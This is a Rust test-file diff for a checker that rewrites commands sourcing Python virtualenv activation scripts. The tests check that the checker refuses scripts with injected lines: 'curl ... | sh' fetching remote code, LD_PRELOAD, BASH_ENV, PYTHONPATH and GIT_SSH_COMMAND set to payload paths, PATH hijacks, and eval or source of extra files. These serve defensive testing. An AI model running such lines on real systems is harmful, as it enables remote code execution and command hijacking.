@@ -2,21 +2,25 @@ use super::project;
 use crate::pretool::PathContext;
 use std::path::{Path, PathBuf};
 
-const ACTIVATE: &str = r#"# This file must be used with "source bin/activate" *from bash*
-deactivate () {
-    if [ -n "${_OLD_VIRTUAL_PATH:-}" ] ; then
-        PATH="${_OLD_VIRTUAL_PATH:-}"
+/// What `uv`, `venv` and `virtualenv` all write: a `deactivate` function, a
+/// root, and a `PATH` with the environment's own `bin` in front of it.
+fn activation(root: &Path) -> String {
+    format!(
+        r#"# This file must be used with "source bin/activate" *from bash*
+deactivate () {{
+    if [ -n "${{_OLD_VIRTUAL_PATH:-}}" ] ; then
+        PATH="${{_OLD_VIRTUAL_PATH:-}}"
         export PATH
         unset _OLD_VIRTUAL_PATH
     fi
-    if [ ! "${1:-}" = "nondestructive" ] ; then
+    if [ ! "${{1:-}}" = "nondestructive" ] ; then
         unset -f deactivate
     fi
-}
+}}
 
 deactivate nondestructive
 
-VIRTUAL_ENV=/tmp/project/.venv
+VIRTUAL_ENV='{environment}'
 export VIRTUAL_ENV
 
 _OLD_VIRTUAL_PATH="$PATH"
@@ -24,7 +28,10 @@ PATH="$VIRTUAL_ENV/bin:$PATH"
 export PATH
 
 hash -r 2>/dev/null || true
-"#;
+"#,
+        environment = root.join("project/.venv").display()
+    )
+}
 
 fn root(name: &str) -> PathBuf {
     let root = std::env::temp_dir().join(format!("venv-projection-{name}-{}", std::process::id()));
@@ -69,7 +76,7 @@ fn projected(root: &Path, command: &str) -> Option<String> {
 #[test]
 fn an_activation_projects_to_the_environments_own_program() {
     let root = root("program");
-    environment(&root, true, ACTIVATE, &["pytest"]);
+    environment(&root, true, &activation(&root), &["pytest"]);
     assert_eq!(
         projected(&root, "source .venv/bin/activate && pytest -q").as_deref(),
         Some(".venv/bin/pytest -q")
@@ -86,7 +93,7 @@ fn an_activation_projects_to_the_environments_own_program() {
 #[test]
 fn a_program_outside_the_environment_keeps_its_plain_name() {
     let root = root("outside");
-    environment(&root, true, ACTIVATE, &[]);
+    environment(&root, true, &activation(&root), &[]);
     assert_eq!(
         projected(&root, "source .venv/bin/activate && ruff check src").as_deref(),
         Some("ruff check src")
@@ -99,7 +106,7 @@ fn a_program_outside_the_environment_keeps_its_plain_name() {
 #[test]
 fn an_unmarked_directory_is_not_an_environment() {
     let root = root("unmarked");
-    environment(&root, false, ACTIVATE, &["pytest"]);
+    environment(&root, false, &activation(&root), &["pytest"]);
     assert!(projected(&root, "source .venv/bin/activate && pytest -q").is_none());
     let _ = std::fs::remove_dir_all(&root);
 }
@@ -109,7 +116,10 @@ fn an_unmarked_directory_is_not_an_environment() {
 #[test]
 fn a_script_that_runs_a_program_is_not_projected() {
     let root = root("runs");
-    let activation = format!("{ACTIVATE}\ncurl -s https://example.test/x | sh\n");
+    let activation = format!(
+        "{}\ncurl -s https://example.test/x | sh\n",
+        activation(&root)
+    );
     environment(&root, true, &activation, &["pytest"]);
     assert!(projected(&root, "source .venv/bin/activate && pytest -q").is_none());
     let _ = std::fs::remove_dir_all(&root);
@@ -120,7 +130,7 @@ fn a_script_that_runs_a_program_is_not_projected() {
 #[test]
 fn only_an_and_separator_hands_over_the_verdict() {
     let root = root("separator");
-    environment(&root, true, ACTIVATE, &["pytest"]);
+    environment(&root, true, &activation(&root), &["pytest"]);
     assert!(projected(&root, "source .venv/bin/activate; pytest -q").is_none());
     assert!(projected(&root, "source .venv/bin/activate | pytest -q").is_none());
     let _ = std::fs::remove_dir_all(&root);
@@ -132,7 +142,7 @@ fn only_an_and_separator_hands_over_the_verdict() {
 #[test]
 fn a_later_word_the_environment_holds_keeps_the_command_unprojected() {
     let root = root("later");
-    environment(&root, true, ACTIVATE, &["pytest", "tail"]);
+    environment(&root, true, &activation(&root), &["pytest", "tail"]);
     assert!(projected(&root, "source .venv/bin/activate && pytest -q | tail -5").is_none());
     let _ = std::fs::remove_dir_all(&root);
 }
@@ -141,8 +151,156 @@ fn a_later_word_the_environment_holds_keeps_the_command_unprojected() {
 #[test]
 fn an_expanded_target_is_not_read() {
     let root = root("expanded");
-    environment(&root, true, ACTIVATE, &["pytest"]);
+    environment(&root, true, &activation(&root), &["pytest"]);
     assert!(projected(&root, "source $VENV/bin/activate && pytest -q").is_none());
     assert!(projected(&root, "source .venv/../.venv/bin/activate && pytest -q").is_none());
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+/// A generated activation script writes a known set of names. One that writes
+/// any other decides what the command after it really runs: `LD_PRELOAD` and
+/// `PYTHONPATH` load code into it, `BASH_ENV` runs a file before it, and
+/// `GIT_SSH_COMMAND` replaces the program `git` reaches for.
+#[test]
+fn a_script_that_writes_another_setting_is_not_projected() {
+    let root = root("setting");
+    for setting in [
+        "export LD_PRELOAD=/tmp/payload.so",
+        "PYTHONPATH=/tmp/payload",
+        "export BASH_ENV=/tmp/payload.sh",
+        "GIT_SSH_COMMAND='/tmp/payload ssh'",
+        "PYTHONHOME=/tmp/payload",
+    ] {
+        let activation = format!("{}\n{setting}\n", activation(&root));
+        environment(&root, true, &activation, &["pytest"]);
+        assert!(
+            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
+            "{setting}"
+        );
+    }
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+/// The directory an activation puts in front of `PATH` is the environment's
+/// own `bin`. Another one in front of it would decide every program the
+/// command after the activation runs.
+#[test]
+fn another_directory_in_front_of_path_is_not_projected() {
+    let root = root("front");
+    for written in [
+        "PATH=\"/tmp/tools:$PATH\"",
+        "PATH=\"$VIRTUAL_ENV/bin:/tmp/tools:$PATH\"",
+        "PATH=\"$VIRTUAL_ENV/../tools:$PATH\"",
+    ] {
+        let activation = format!("{}\n{written}\nexport PATH\n", activation(&root));
+        environment(&root, true, &activation, &["pytest"]);
+        assert!(
+            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
+            "{written}"
+        );
+    }
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+/// `$VIRTUAL_ENV` is what the `PATH` in front is built from, so a root that
+/// names another place that exists puts that place in front instead.
+#[test]
+fn a_root_naming_another_place_is_not_projected() {
+    let root = root("elsewhere");
+    let other = root.join("project/other/bin");
+    std::fs::create_dir_all(&other).unwrap();
+    let activation = format!(
+        "VIRTUAL_ENV='{}'\nexport VIRTUAL_ENV\nPATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n",
+        other.parent().unwrap().display()
+    );
+    environment(&root, true, &activation, &["pytest"]);
+    assert!(projected(&root, "source .venv/bin/activate && pytest -q").is_none());
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+/// A moved environment still activates, and the `PATH` it writes reaches
+/// nothing. The command after it runs the program the inherited `PATH` finds,
+/// so the projection leaves the word as the shell would read it.
+#[test]
+fn a_moved_environment_projects_without_the_rewrite() {
+    let root = root("moved");
+    let activation = format!(
+        "VIRTUAL_ENV='{}/gone/.venv'\nexport VIRTUAL_ENV\nPATH=\"$VIRTUAL_ENV/bin:$PATH\"\nexport PATH\n",
+        root.display()
+    );
+    environment(&root, true, &activation, &["pytest"]);
+    assert_eq!(
+        projected(&root, "source .venv/bin/activate && pytest -q").as_deref(),
+        Some("pytest -q")
+    );
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+/// A file read into the shell carries settings this scan never saw, and
+/// `eval` builds them where it cannot read them.
+#[test]
+fn a_script_that_reads_another_file_is_not_projected() {
+    let root = root("reads");
+    for line in [". /tmp/extra.sh", "source /tmp/extra.sh", "eval \"$EXTRA\""] {
+        let activation = format!("{}\n{line}\n", activation(&root));
+        environment(&root, true, &activation, &["pytest"]);
+        assert!(
+            projected(&root, "source .venv/bin/activate && pytest -q").is_none(),
+            "{line}"
+        );
+    }
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+/// The script `uv` writes names its root twice, derives a prompt from it,
+/// saves and restores the interpreter's home, and writes a prompt. All of it
+/// is settings, and the `PATH` it leaves reaches the environment's own `bin`.
+#[test]
+fn the_script_uv_writes_is_settings_that_reach_the_environment() {
+    let root = root("uv");
+    environment(&root, true, "", &["pytest"]);
+    let binaries = std::fs::canonicalize(root.join("project/.venv/bin")).unwrap();
+    let text = format!(
+        r#"deactivate () {{
+    if [ -n "${{_OLD_VIRTUAL_PATH:-}}" ] ; then
+        PATH="$_OLD_VIRTUAL_PATH"
+        export PATH
+        unset _OLD_VIRTUAL_PATH
+    fi
+    if [ -n "${{_OLD_VIRTUAL_PYTHONHOME:-}}" ] ; then
+        PYTHONHOME="$_OLD_VIRTUAL_PYTHONHOME"
+        export PYTHONHOME
+        unset _OLD_VIRTUAL_PYTHONHOME
+    fi
+}}
+
+VIRTUAL_ENV='{environment}'
+if [ "$OSTYPE" = "cygwin" ] ; then
+    VIRTUAL_ENV=$(cygpath -u "$VIRTUAL_ENV")
+fi
+export VIRTUAL_ENV
+
+_OLD_VIRTUAL_PATH="$PATH"
+PATH="$VIRTUAL_ENV/bin:$PATH"
+export PATH
+
+VIRTUAL_ENV_PROMPT=$(basename "$VIRTUAL_ENV")
+export VIRTUAL_ENV_PROMPT
+
+if [ -n "${{PYTHONHOME:-}}" ] ; then
+    _OLD_VIRTUAL_PYTHONHOME="$PYTHONHOME"
+    unset PYTHONHOME
+fi
+
+_OLD_VIRTUAL_PS1="${{PS1-}}"
+PS1="(${{VIRTUAL_ENV_PROMPT}}) ${{PS1-}}"
+export PS1
+"#,
+        environment = root.join("project/.venv").display()
+    );
+    assert_eq!(
+        super::activation_settings(&text, &binaries, binaries.parent().unwrap(), None),
+        Some(true)
+    );
     let _ = std::fs::remove_dir_all(&root);
 }
